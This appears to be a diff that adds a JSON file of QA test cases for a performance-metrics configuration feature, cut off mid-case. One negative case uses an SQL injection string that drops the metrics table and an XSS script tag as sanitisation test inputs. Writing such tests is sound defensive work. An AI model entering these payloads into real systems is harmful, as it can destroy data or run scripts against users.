@@ -1,0 +1,2129 @@
+{
+  "storyId": "ado-14136",
+  "storyTitle": "As Performance Analyst, I want to configure performance metrics to achieve tailored monitoring for my team",
+  "testCases": [],
+  "functional": [
+    {
+      "id": "TC-FUNC-001",
+      "title": "Verify Performance Analyst can successfully select and save predefined metrics from dropdown",
+      "category": "Functional",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with Performance Analyst role and has metric configuration permissions",
+        "User is on the metrics configuration page at /metrics/configure",
+        "Metrics database contains at least 5 predefined metrics (e.g., Response Time, Throughput, Error Rate, CPU Usage, Memory Usage)",
+        "Page load time is under 2 seconds as per performance requirements"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Locate the 'Predefined Metrics' dropdown menu on the metrics configuration page",
+          "expectedResult": "Dropdown menu is visible and displays placeholder text 'Select metrics to monitor'"
+        },
+        {
+          "step": 2,
+          "action": "Click on the 'Predefined Metrics' dropdown to expand the list of available metrics",
+          "expectedResult": "Dropdown expands showing all predefined metrics with checkboxes: Response Time, Throughput, Error Rate, CPU Usage, Memory Usage"
+        },
+        {
+          "step": 3,
+          "action": "Select 'Response Time', 'Throughput', and 'Error Rate' by clicking their respective checkboxes",
+          "expectedResult": "Selected metrics are highlighted with blue checkmarks and appear as tags below the dropdown"
+        },
+        {
+          "step": 4,
+          "action": "Click the 'Save Configuration' button located at the bottom-right of the page",
+          "expectedResult": "System displays a green success banner at the top of the page with message 'Metrics configuration saved successfully' and the page remains on the configuration screen"
+        },
+        {
+          "step": 5,
+          "action": "Refresh the metrics configuration page",
+          "expectedResult": "Previously selected metrics (Response Time, Throughput, Error Rate) are still displayed as selected with checkmarks in the dropdown"
+        }
+      ],
+      "postconditions": [
+        "Selected metrics (Response Time, Throughput, Error Rate) are saved to the metrics database table associated with the user's profile",
+        "User remains logged in and on the metrics configuration page",
+        "Configuration is available for future monitoring sessions",
+        "Audit log records the metric configuration change with timestamp and user ID"
+      ]
+    },
+    {
+      "id": "TC-FUNC-002",
+      "title": "Verify Performance Analyst can create a custom metric with all required details",
+      "category": "Functional",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page at /metrics/configure",
+        "No existing custom metric with the name 'Customer Satisfaction Score' exists in the database",
+        "User has permissions to create custom metrics"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click the 'Create Custom Metric' button located below the predefined metrics section",
+          "expectedResult": "A modal dialog opens with title 'Create Custom Metric' containing fields: Metric Name, Description, Unit of Measurement, Calculation Formula, and Data Source"
+        },
+        {
+          "step": 2,
+          "action": "Enter 'Customer Satisfaction Score' in the 'Metric Name' field",
+          "expectedResult": "Text appears in the Metric Name field as typed"
+        },
+        {
+          "step": 3,
+          "action": "Enter 'Measures customer satisfaction based on survey responses' in the 'Description' field",
+          "expectedResult": "Description text is entered and displayed in the field"
+        },
+        {
+          "step": 4,
+          "action": "Select 'Percentage' from the 'Unit of Measurement' dropdown",
+          "expectedResult": "Percentage is selected and displayed in the dropdown field"
+        },
+        {
+          "step": 5,
+          "action": "Enter '(positive_responses / total_responses) * 100' in the 'Calculation Formula' field",
+          "expectedResult": "Formula is entered and displayed correctly in the field"
+        },
+        {
+          "step": 6,
+          "action": "Select 'Customer Survey Database' from the 'Data Source' dropdown",
+          "expectedResult": "Data source is selected and displayed"
+        },
+        {
+          "step": 7,
+          "action": "Click the 'Create Metric' button at the bottom of the modal",
+          "expectedResult": "Modal closes, green success message 'Custom metric \"Customer Satisfaction Score\" created successfully' appears at the top of the page, and the new metric appears in the custom metrics list"
+        }
+      ],
+      "postconditions": [
+        "Custom metric 'Customer Satisfaction Score' is saved to the metrics database table with unique ID",
+        "New metric is available for selection in future configurations",
+        "User remains on the metrics configuration page with modal closed",
+        "System validates metric name uniqueness and stores all entered details"
+      ]
+    },
+    {
+      "id": "TC-FUNC-003",
+      "title": "Verify Performance Analyst can edit an existing custom metric successfully",
+      "category": "Functional",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page",
+        "At least one custom metric named 'Team Velocity' exists in the system with description 'Measures team output per sprint'",
+        "User has edit permissions for metrics"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Locate the 'Team Velocity' metric in the custom metrics list and click the 'Edit' icon (pencil icon) next to it",
+          "expectedResult": "Edit Custom Metric modal opens pre-populated with existing data: Name='Team Velocity', Description='Measures team output per sprint'"
+        },
+        {
+          "step": 2,
+          "action": "Update the 'Description' field to 'Measures story points completed by team per sprint'",
+          "expectedResult": "Description field updates with the new text"
+        },
+        {
+          "step": 3,
+          "action": "Change the 'Unit of Measurement' from 'Count' to 'Story Points'",
+          "expectedResult": "Unit of Measurement dropdown displays 'Story Points' as selected"
+        },
+        {
+          "step": 4,
+          "action": "Click the 'Update Metric' button at the bottom of the modal",
+          "expectedResult": "Modal closes and green success message 'Metric \"Team Velocity\" updated successfully' appears at the top of the page"
+        },
+        {
+          "step": 5,
+          "action": "Verify the updated metric details by clicking the 'Edit' icon again for 'Team Velocity'",
+          "expectedResult": "Modal opens showing updated description 'Measures story points completed by team per sprint' and unit 'Story Points'"
+        }
+      ],
+      "postconditions": [
+        "Team Velocity metric is updated in the metrics database with new description and unit",
+        "Updated metric details are reflected in all monitoring dashboards using this metric",
+        "User remains on the metrics configuration page",
+        "Audit log records the metric update with timestamp, user ID, and changed fields"
+      ]
+    },
+    {
+      "id": "TC-FUNC-004",
+      "title": "Verify Performance Analyst can delete a metric that is no longer in use",
+      "category": "Functional",
+      "priority": "Medium",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page",
+        "A custom metric named 'Deprecated Metric' exists and is not currently used in any active monitoring dashboard",
+        "User has delete permissions for metrics"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Locate the 'Deprecated Metric' in the custom metrics list and click the 'Delete' icon (trash icon) next to it",
+          "expectedResult": "A confirmation dialog appears with message 'Are you sure you want to delete \"Deprecated Metric\"? This action cannot be undone.' and buttons 'Cancel' and 'Delete'"
+        },
+        {
+          "step": 2,
+          "action": "Click the 'Delete' button in the confirmation dialog",
+          "expectedResult": "Confirmation dialog closes, green success message 'Metric \"Deprecated Metric\" deleted successfully' appears at the top of the page"
+        },
+        {
+          "step": 3,
+          "action": "Verify the metric is removed by scrolling through the custom metrics list",
+          "expectedResult": "'Deprecated Metric' is no longer visible in the custom metrics list"
+        },
+        {
+          "step": 4,
+          "action": "Refresh the metrics configuration page",
+          "expectedResult": "Page reloads and 'Deprecated Metric' remains absent from the custom metrics list"
+        }
+      ],
+      "postconditions": [
+        "Deprecated Metric is permanently removed from the metrics database table",
+        "Metric is no longer available for selection in future configurations",
+        "User remains logged in and on the metrics configuration page",
+        "Audit log records the metric deletion with timestamp and user ID"
+      ]
+    },
+    {
+      "id": "TC-FUNC-005",
+      "title": "Verify Performance Analyst can save a complete configuration with both predefined and custom metrics",
+      "category": "Functional",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page",
+        "System has predefined metrics available (Response Time, Error Rate)",
+        "User has previously created a custom metric named 'Team Productivity Index'"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Select 'Response Time' and 'Error Rate' from the predefined metrics dropdown",
+          "expectedResult": "Both metrics are selected with checkmarks and appear as tags below the dropdown"
+        },
+        {
+          "step": 2,
+          "action": "In the custom metrics section, check the checkbox next to 'Team Productivity Index'",
+          "expectedResult": "Custom metric is selected with a blue checkmark"
+        },
+        {
+          "step": 3,
+          "action": "Enter 'Q1 2024 Performance Monitoring' in the 'Configuration Name' field at the top of the page",
+          "expectedResult": "Configuration name is entered and displayed in the field"
+        },
+        {
+          "step": 4,
+          "action": "Click the 'Save Configuration' button at the bottom-right of the page",
+          "expectedResult": "Green success banner appears with message 'Configuration \"Q1 2024 Performance Monitoring\" saved successfully with 3 metrics'"
+        },
+        {
+          "step": 5,
+          "action": "Navigate to 'My Saved Configurations' section by clicking the tab at the top of the page",
+          "expectedResult": "Saved configuration 'Q1 2024 Performance Monitoring' appears in the list showing 3 metrics (Response Time, Error Rate, Team Productivity Index) with creation timestamp"
+        }
+      ],
+      "postconditions": [
+        "Complete configuration is saved to database with unique configuration ID linking to all 3 selected metrics",
+        "Configuration is available for loading and reuse in future sessions",
+        "All selected metrics (2 predefined, 1 custom) are associated with the saved configuration",
+        "User can access this configuration from the monitoring dashboard"
+      ]
+    },
+    {
+      "id": "TC-FUNC-006",
+      "title": "Verify metrics configuration page loads within 2 seconds with all elements displayed",
+      "category": "Functional",
+      "priority": "Medium",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "Metrics database contains 20 predefined metrics and 15 custom metrics",
+        "User has stable network connection",
+        "Browser cache is cleared"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Navigate to the metrics configuration page by clicking 'Configure Metrics' from the main navigation menu",
+          "expectedResult": "Page begins loading and browser shows loading indicator"
+        },
+        {
+          "step": 2,
+          "action": "Measure the time from navigation click to full page render using browser developer tools Performance tab",
+          "expectedResult": "Page load time is under 2 seconds as measured in the Performance timeline"
+        },
+        {
+          "step": 3,
+          "action": "Verify all page elements are visible: page title 'Configure Performance Metrics', predefined metrics dropdown, custom metrics section, 'Create Custom Metric' button, and 'Save Configuration' button",
+          "expectedResult": "All UI elements are fully rendered and interactive within the 2-second load time"
+        },
+        {
+          "step": 4,
+          "action": "Click the predefined metrics dropdown to verify data is loaded",
+          "expectedResult": "Dropdown expands immediately showing all 20 predefined metrics without additional loading delay"
+        }
+      ],
+      "postconditions": [
+        "Metrics configuration page is fully loaded and functional",
+        "All metrics data is retrieved from the database and displayed",
+        "User can interact with all page elements without delay",
+        "Performance requirement of under 2 seconds load time is met"
+      ]
+    }
+  ],
+  "negative": [
+    {
+      "id": "TC-NEGA-001",
+      "title": "Verify system prevents creating custom metric with duplicate name",
+      "category": "Negative",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page",
+        "A custom metric named 'Response Time Custom' already exists in the metrics database",
+        "User has permissions to create custom metrics"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click the 'Create Custom Metric' button",
+          "expectedResult": "Create Custom Metric modal opens with empty fields"
+        },
+        {
+          "step": 2,
+          "action": "Enter 'Response Time Custom' (exact duplicate name) in the 'Metric Name' field",
+          "expectedResult": "Text is entered in the Metric Name field"
+        },
+        {
+          "step": 3,
+          "action": "Fill in remaining required fields: Description='Test duplicate', Unit='Seconds', Formula='avg(response)', Data Source='API Logs'",
+          "expectedResult": "All fields are populated with entered data"
+        },
+        {
+          "step": 4,
+          "action": "Click the 'Create Metric' button",
+          "expectedResult": "Modal remains open, red error message appears below the Metric Name field stating 'A metric with this name already exists. Please choose a unique name.', and the metric is not created"
+        },
+        {
+          "step": 5,
+          "action": "Verify the 'Create Metric' button remains enabled for correction",
+          "expectedResult": "Button is still enabled allowing user to correct the name and retry"
+        }
+      ],
+      "postconditions": [
+        "No duplicate metric is created in the metrics database",
+        "Existing 'Response Time Custom' metric remains unchanged",
+        "User remains on the Create Custom Metric modal to correct the error",
+        "Database maintains metric name uniqueness constraint"
+      ]
+    },
+    {
+      "id": "TC-NEGA-002",
+      "title": "Verify system prevents saving custom metric with empty required fields",
+      "category": "Negative",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page",
+        "User has permissions to create custom metrics"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click the 'Create Custom Metric' button",
+          "expectedResult": "Create Custom Metric modal opens with all fields empty"
+        },
+        {
+          "step": 2,
+          "action": "Leave the 'Metric Name' field empty and enter 'Test Description' in the Description field only",
+          "expectedResult": "Description field contains text, Metric Name remains empty"
+        },
+        {
+          "step": 3,
+          "action": "Click the 'Create Metric' button without filling other required fields",
+          "expectedResult": "Modal remains open, red error messages appear: 'Metric Name is required' below the name field, 'Unit of Measurement is required' below unit field, 'Calculation Formula is required' below formula field, 'Data Source is required' below data source field"
+        },
+        {
+          "step": 4,
+          "action": "Verify the metric name field has a red border indicating validation error",
+          "expectedResult": "All empty required fields display red borders and error messages"
+        },
+        {
+          "step": 5,
+          "action": "Attempt to close the modal by clicking the 'X' button and verify no data is saved",
+          "expectedResult": "Modal closes without saving, no new metric appears in the custom metrics list"
+        }
+      ],
+      "postconditions": [
+        "No incomplete metric is created in the metrics database",
+        "User is returned to the metrics configuration page",
+        "Form validation prevents submission of incomplete data",
+        "No database records are created or modified"
+      ]
+    },
+    {
+      "id": "TC-NEGA-003",
+      "title": "Verify system prevents unauthorized user without Performance Analyst role from accessing metrics configuration",
+      "category": "Negative",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with 'Viewer' role (no metric configuration permissions)",
+        "User is on the main dashboard page",
+        "Role-based access control is enforced for /metrics/configure endpoint",
+        "User does not have 'metric_configuration' permission in their role"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Attempt to navigate to the metrics configuration page by entering URL '/metrics/configure' directly in the browser address bar",
+          "expectedResult": "System redirects to an error page showing '403 Forbidden - Access Denied' message"
+        },
+        {
+          "step": 2,
+          "action": "Verify the error page displays message 'You do not have permission to configure metrics. Please contact your administrator.'",
+          "expectedResult": "Error message is clearly displayed with contact information"
+        },
+        {
+          "step": 3,
+          "action": "Check the main navigation menu for 'Configure Metrics' option",
+          "expectedResult": "'Configure Metrics' menu item is not visible or is disabled/grayed out for users without proper permissions"
+        },
+        {
+          "step": 4,
+          "action": "Attempt to make a direct API call to POST /api/metrics/configure using browser console with payload {\"metricName\": \"Unauthorized Metric\"}",
+          "expectedResult": "API returns 403 Forbidden status code with JSON response {\"error\": \"Insufficient permissions\", \"message\": \"User does not have metric configuration access\"}"
+        }
+      ],
+      "postconditions": [
+        "No unauthorized access is granted to metrics configuration functionality",
+        "No metrics are created or modified by unauthorized user",
+        "Security audit log records the unauthorized access attempt with user ID and timestamp",
+        "User remains on error page or is redirected to dashboard"
+      ]
+    },
+    {
+      "id": "TC-NEGA-004",
+      "title": "Verify system prevents deletion of metric currently in use by active monitoring dashboard",
+      "category": "Negative",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page",
+        "A custom metric named 'Active Dashboard Metric' exists and is currently used in 2 active monitoring dashboards",
+        "System tracks metric usage across dashboards"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Locate 'Active Dashboard Metric' in the custom metrics list and click the 'Delete' icon",
+          "expectedResult": "A warning dialog appears with message 'Cannot delete \"Active Dashboard Metric\". This metric is currently used in 2 active dashboards: Team Performance Dashboard, Executive Summary Dashboard. Please remove it from these dashboards first.'"
+        },
+        {
+          "step": 2,
+          "action": "Verify the dialog shows only an 'OK' button (no 'Delete' button)",
+          "expectedResult": "Dialog displays only 'OK' button and does not provide option to proceed with deletion"
+        },
+        {
+          "step": 3,
+          "action": "Click the 'OK' button to close the warning dialog",
+          "expectedResult": "Dialog closes and user returns to metrics configuration page with the metric still present in the list"
+        },
+        {
+          "step": 4,
+          "action": "Verify 'Active Dashboard Metric' is still visible and unchanged in the custom metrics list",
+          "expectedResult": "Metric remains in the list with all original properties intact"
+        }
+      ],
+      "postconditions": [
+        "Active Dashboard Metric remains in the metrics database unchanged",
+        "Metric continues to function in the 2 active dashboards",
+        "System maintains referential integrity by preventing deletion of in-use metrics",
+        "User is informed of the dependency preventing deletion"
+      ]
+    },
+    {
+      "id": "TC-NEGA-005",
+      "title": "Verify system handles invalid calculation formula in custom metric creation",
+      "category": "Negative",
+      "priority": "Medium",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page",
+        "System validates calculation formulas for syntax and allowed functions"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click the 'Create Custom Metric' button",
+          "expectedResult": "Create Custom Metric modal opens"
+        },
+        {
+          "step": 2,
+          "action": "Enter 'Invalid Formula Metric' in Metric Name field",
+          "expectedResult": "Name is entered successfully"
+        },
+        {
+          "step": 3,
+          "action": "Enter invalid formula 'sum(value) / 0' in the Calculation Formula field",
+          "expectedResult": "Formula text is entered in the field"
+        },
+        {
+          "step": 4,
+          "action": "Fill remaining required fields: Description='Test', Unit='Count', Data Source='Test DB'",
+          "expectedResult": "All fields are populated"
+        },
+        {
+          "step": 5,
+          "action": "Click the 'Create Metric' button",
+          "expectedResult": "Modal remains open, red error message appears below Calculation Formula field stating 'Invalid formula: Division by zero is not allowed. Please enter a valid calculation formula.'"
+        },
+        {
+          "step": 6,
+          "action": "Change formula to 'invalid_function(value)' and click 'Create Metric' again",
+          "expectedResult": "Error message updates to 'Invalid formula: Function \"invalid_function\" is not recognized. Allowed functions: sum, avg, count, min, max.'"
+        }
+      ],
+      "postconditions": [
+        "No metric with invalid formula is created in the database",
+        "User remains on the Create Custom Metric modal to correct the formula",
+        "System validates formula syntax before database insertion",
+        "Data integrity is maintained by preventing invalid calculations"
+      ]
+    },
+    {
+      "id": "TC-NEGA-006",
+      "title": "Verify system handles session timeout during metric configuration",
+      "category": "Negative",
+      "priority": "Medium",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page with Create Custom Metric modal open",
+        "User has filled in metric details but not yet saved",
+        "Session timeout is set to 30 minutes"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Fill in all fields in Create Custom Metric modal: Name='Session Test Metric', Description='Testing session timeout', Unit='Count', Formula='sum(value)', Data Source='Test DB'",
+          "expectedResult": "All fields are populated with entered data"
+        },
+        {
+          "step": 2,
+          "action": "Wait for session to expire (simulate by clearing session cookie or waiting 30+ minutes)",
+          "expectedResult": "Session expires in the background"
+        },
+        {
+          "step": 3,
+          "action": "Click the 'Create Metric' button to attempt saving",
+          "expectedResult": "System detects expired session and displays error message 'Your session has expired. Please log in again to continue.' Modal closes and user is redirected to login page"
+        },
+        {
+          "step": 4,
+          "action": "Log in again with Performance Analyst credentials",
+          "expectedResult": "User successfully logs in and is redirected to the main dashboard"
+        },
+        {
+          "step": 5,
+          "action": "Navigate back to metrics configuration page and verify 'Session Test Metric' was not created",
+          "expectedResult": "Metric does not appear in custom metrics list, confirming unsaved data was not persisted"
+        }
+      ],
+      "postconditions": [
+        "No metric is created due to expired session",
+        "User is logged out and must re-authenticate",
+        "Unsaved form data is lost (expected behavior for security)",
+        "System maintains security by enforcing session timeout"
+      ]
+    },
+    {
+      "id": "TC-NEGA-007",
+      "title": "Verify system handles special characters and SQL injection attempts in metric name field",
+      "category": "Negative",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in with Performance Analyst role",
+        "User is on the metrics configuration page",
+        "System has input sanitization and SQL injection prevention enabled"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click the 'Create Custom Metric' button",
+          "expectedResult": "Create Custom Metric modal opens"
+        },
+        {
+          "step": 2,
+          "action": "Enter SQL injection string 'Test'; DROP TABLE metrics; --' in the Metric Name field",
+          "expectedResult": "Text is entered in the field"
+        },
+        {
+          "step": 3,
+          "action": "Fill remaining required fields with valid data and click 'Create Metric'",
+          "expectedResult": "System sanitizes input and displays error message 'Metric name contains invalid characters. Only letters, numbers, spaces, hyphens, and underscores are allowed.' Metric is not created and database tables remain intact"
+        },
+        {
+          "step": 4,
+          "action": "Clear the field and enter special characters '<script>alert(\"XSS\")</script>' in Metric Name",
+          "expectedResult": "Text is entered in the field"
+        },
+        {
+          "step": 5,
+          "action": "Click 'Create Metric' button",
+          "expectedResult": "System sanitizes input, displays same error message about invalid characters, and prevents XSS attack. No script execution occurs"
+        },
+        {
+          "step": 6,
+          "action": "Enter excessively long string (500 characters) in Metric Name field",
+          "expectedResult": "Field enforces character limit, displays error 'Metric name must be between 1 and 100 characters', and prevents submission"
+        }
+      ],
+      "postconditions": [
+        "No malicious code is executed or stored in the database",
+        "Database tables remain intact and unchanged",
+        "Input validation prevents SQL injection and XSS attacks",
+        "System security is maintained through proper input sanitization"
+      ]
+    }
+  ],
+  "edgeCases": [
+    {
+      "id": "TC-EDGE-001",
+      "title": "Configure metric with maximum allowed character length in metric name",
+      "category": "Edge Cases",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in as Performance Analyst with metric configuration permissions",
+        "User is on the metrics configuration page",
+        "System has character limit of 255 characters for metric names",
+        "No existing metrics with the same name exist in the database"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click on 'Create Custom Metric' button",
+          "expectedResult": "Custom metric creation form appears with fields for metric name, description, and formula"
+        },
+        {
+          "step": 2,
+          "action": "Enter exactly 255 characters in the 'Metric Name' field (e.g., 'A' repeated 255 times)",
+          "expectedResult": "Field accepts all 255 characters without truncation, character counter shows '255/255'"
+        },
+        {
+          "step": 3,
+          "action": "Enter valid formula 'SUM(sales)/COUNT(orders)' in the 'Formula' field",
+          "expectedResult": "Formula is accepted and validated successfully with green checkmark icon"
+        },
+        {
+          "step": 4,
+          "action": "Click 'Save Metric' button",
+          "expectedResult": "Success message 'Metric successfully created' appears in green banner at top, metric appears in the metrics list with full name visible on hover"
+        }
+      ],
+      "postconditions": [
+        "Metric is saved in the metrics database with full 255-character name",
+        "Metric appears in the predefined metrics dropdown for future selection",
+        "User remains on the metrics configuration page",
+        "Audit log records metric creation with timestamp and user ID"
+      ]
+    },
+    {
+      "id": "TC-EDGE-002",
+      "title": "Create custom metric with special characters and Unicode in metric name",
+      "category": "Edge Cases",
+      "priority": "Medium",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "User is on the metrics configuration page",
+        "System supports UTF-8 character encoding",
+        "Browser supports Unicode character input"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click on 'Create Custom Metric' button",
+          "expectedResult": "Custom metric creation form is displayed"
+        },
+        {
+          "step": 2,
+          "action": "Enter metric name with special characters and Unicode: 'Sales™ Métric 销售 @2024 #Performance (50%)'",
+          "expectedResult": "All characters are accepted and displayed correctly in the input field"
+        },
+        {
+          "step": 3,
+          "action": "Enter description 'Test metric with émojis 🚀📊' and valid formula 'AVG(revenue)'",
+          "expectedResult": "Description and formula fields accept the input, formula validates successfully"
+        },
+        {
+          "step": 4,
+          "action": "Click 'Save Metric' button",
+          "expectedResult": "Metric is saved successfully, success message appears, metric name displays correctly with all special characters and Unicode preserved"
+        },
+        {
+          "step": 5,
+          "action": "Navigate away and return to metrics configuration page",
+          "expectedResult": "Saved metric appears in the list with all special characters and Unicode rendered correctly"
+        }
+      ],
+      "postconditions": [
+        "Metric is stored in database with proper UTF-8 encoding",
+        "Special characters and Unicode are preserved and displayed correctly",
+        "Metric is searchable using any part of its name including Unicode characters",
+        "No character corruption or encoding errors occur"
+      ]
+    },
+    {
+      "id": "TC-EDGE-003",
+      "title": "Attempt to save configuration with maximum number of metrics selected simultaneously",
+      "category": "Edge Cases",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "System has 100 predefined metrics available in the database",
+        "User is on the metrics configuration page",
+        "System has a limit of 50 metrics per configuration"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click on 'Select Predefined Metrics' dropdown",
+          "expectedResult": "Dropdown opens showing all 100 available predefined metrics with checkboxes"
+        },
+        {
+          "step": 2,
+          "action": "Select exactly 50 metrics by checking their checkboxes",
+          "expectedResult": "All 50 metrics are checked, counter shows '50/50 metrics selected', dropdown remains functional"
+        },
+        {
+          "step": 3,
+          "action": "Attempt to select the 51st metric",
+          "expectedResult": "Checkbox is disabled or warning message appears: 'Maximum limit of 50 metrics reached. Please deselect a metric to add another.'"
+        },
+        {
+          "step": 4,
+          "action": "Click 'Save Configuration' button with 50 metrics selected",
+          "expectedResult": "Configuration saves successfully, success message 'Configuration saved with 50 metrics' appears, page load time is under 2 seconds"
+        },
+        {
+          "step": 5,
+          "action": "Refresh the page and verify the configuration",
+          "expectedResult": "All 50 selected metrics are displayed correctly in the configuration, no metrics are missing or duplicated"
+        }
+      ],
+      "postconditions": [
+        "Configuration with 50 metrics is saved in the database",
+        "System performance remains stable with maximum metric load",
+        "All 50 metrics are available for monitoring",
+        "Page load time remains under 2 seconds as per technical requirements"
+      ]
+    },
+    {
+      "id": "TC-EDGE-004",
+      "title": "Rapidly create, edit, and delete multiple metrics in quick succession",
+      "category": "Edge Cases",
+      "priority": "Medium",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "User is on the metrics configuration page",
+        "No existing custom metrics are present",
+        "System has proper concurrency handling implemented"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Quickly create 5 custom metrics by clicking 'Create Custom Metric', entering names 'Metric1' through 'Metric5' with valid formulas, and clicking 'Save' for each within 10 seconds",
+          "expectedResult": "All 5 metrics are created successfully without errors, each shows individual success message, all appear in the metrics list"
+        },
+        {
+          "step": 2,
+          "action": "Immediately click 'Edit' on 'Metric3', change name to 'Metric3-Updated', and save",
+          "expectedResult": "Metric3 is updated successfully, updated name appears in the list, no conflicts with other metrics"
+        },
+        {
+          "step": 3,
+          "action": "Rapidly click 'Delete' on 'Metric1' and 'Metric2' within 2 seconds, confirming both deletions",
+          "expectedResult": "Both metrics are deleted successfully, confirmation messages appear for each, metrics are removed from the list without affecting other metrics"
+        },
+        {
+          "step": 4,
+          "action": "Immediately create a new metric with the same name as deleted 'Metric1'",
+          "expectedResult": "New metric is created successfully without unique constraint violation, system properly handles the reuse of previously deleted metric name"
+        },
+        {
+          "step": 5,
+          "action": "Refresh the page to verify data consistency",
+          "expectedResult": "Page shows correct state: 4 metrics total (Metric1-new, Metric3-Updated, Metric4, Metric5), no duplicate or ghost entries, no data corruption"
+        }
+      ],
+      "postconditions": [
+        "Database maintains data integrity despite rapid operations",
+        "No race conditions or concurrency issues occur",
+        "Audit log correctly records all create, update, and delete operations with accurate timestamps",
+        "System remains responsive and stable"
+      ]
+    },
+    {
+      "id": "TC-EDGE-005",
+      "title": "Configure metrics with empty or minimal valid data in optional fields",
+      "category": "Edge Cases",
+      "priority": "Medium",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "User is on the metrics configuration page",
+        "Custom metric form has required fields (name, formula) and optional fields (description, tags, category)"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Click 'Create Custom Metric' button",
+          "expectedResult": "Custom metric creation form appears with required fields marked with asterisk (*)"
+        },
+        {
+          "step": 2,
+          "action": "Enter only required fields: metric name 'MinimalMetric' and formula 'COUNT(*)', leave all optional fields (description, tags, category) completely empty",
+          "expectedResult": "Form accepts the input, no validation errors appear for empty optional fields"
+        },
+        {
+          "step": 3,
+          "action": "Click 'Save Metric' button",
+          "expectedResult": "Metric is saved successfully with message 'Metric successfully created', metric appears in list with name and formula, optional fields show as 'N/A' or empty placeholders"
+        },
+        {
+          "step": 4,
+          "action": "Create another metric with single-character values in optional fields: name 'M', description 'D', single tag 'T', formula 'SUM(1)'",
+          "expectedResult": "Metric is created successfully, all single-character values are accepted and saved"
+        },
+        {
+          "step": 5,
+          "action": "View both metrics in the configuration list",
+          "expectedResult": "Both metrics display correctly, minimal data is rendered properly without UI breaking, metrics are functional for selection"
+        }
+      ],
+      "postconditions": [
+        "Metrics with minimal data are stored correctly in database",
+        "UI handles empty optional fields gracefully without display issues",
+        "Metrics are fully functional despite minimal configuration",
+        "No null pointer exceptions or rendering errors occur"
+      ]
+    },
+    {
+      "id": "TC-EDGE-006",
+      "title": "Test metric configuration with simultaneous users editing the same metric",
+      "category": "Edge Cases",
+      "priority": "High",
+      "preconditions": [
+        "Two Performance Analyst users (User A and User B) are logged in on different browsers/sessions",
+        "A custom metric named 'SharedMetric' exists in the system",
+        "Both users have the metrics configuration page open showing 'SharedMetric'",
+        "System implements optimistic or pessimistic locking for concurrent edits"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "User A clicks 'Edit' button on 'SharedMetric'",
+          "expectedResult": "Edit form opens for User A with current metric details populated"
+        },
+        {
+          "step": 2,
+          "action": "User B clicks 'Edit' button on the same 'SharedMetric' within 5 seconds",
+          "expectedResult": "System either: (a) shows warning 'This metric is currently being edited by another user' and prevents editing, OR (b) allows editing with conflict detection enabled"
+        },
+        {
+          "step": 3,
+          "action": "User A changes metric name to 'SharedMetric-A' and clicks 'Save'",
+          "expectedResult": "User A's changes are saved successfully, success message appears"
+        },
+        {
+          "step": 4,
+          "action": "User B (if allowed to edit) changes metric name to 'SharedMetric-B' and clicks 'Save'",
+          "expectedResult": "System detects conflict and shows message 'This metric was modified by another user. Please refresh and try again.' OR User B's save is rejected with appropriate error message"
+        },
+        {
+          "step": 5,
+          "action": "User B refreshes the page and verifies the current state",
+          "expectedResult": "Page shows metric with User A's changes ('SharedMetric-A'), data integrity is maintained, no data loss occurred"
+        }
+      ],
+      "postconditions": [
+        "Only one set of changes is persisted (User A's changes)",
+        "No data corruption or merge conflicts occur",
+        "System maintains data integrity with proper concurrency control",
+        "Audit log shows both edit attempts with appropriate status (success for User A, conflict/rejected for User B)"
+      ]
+    },
+    {
+      "id": "TC-EDGE-007",
+      "title": "Test system behavior when metrics database connection is slow or times out during save operation",
+      "category": "Edge Cases",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "User is on the metrics configuration page",
+        "Network throttling or database delay simulation is enabled (response time > 30 seconds)",
+        "User has created a new custom metric ready to save"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Fill in custom metric form with name 'TimeoutTestMetric', description 'Testing timeout behavior', and formula 'AVG(sales)'",
+          "expectedResult": "Form is filled correctly, all validation passes"
+        },
+        {
+          "step": 2,
+          "action": "Click 'Save Metric' button",
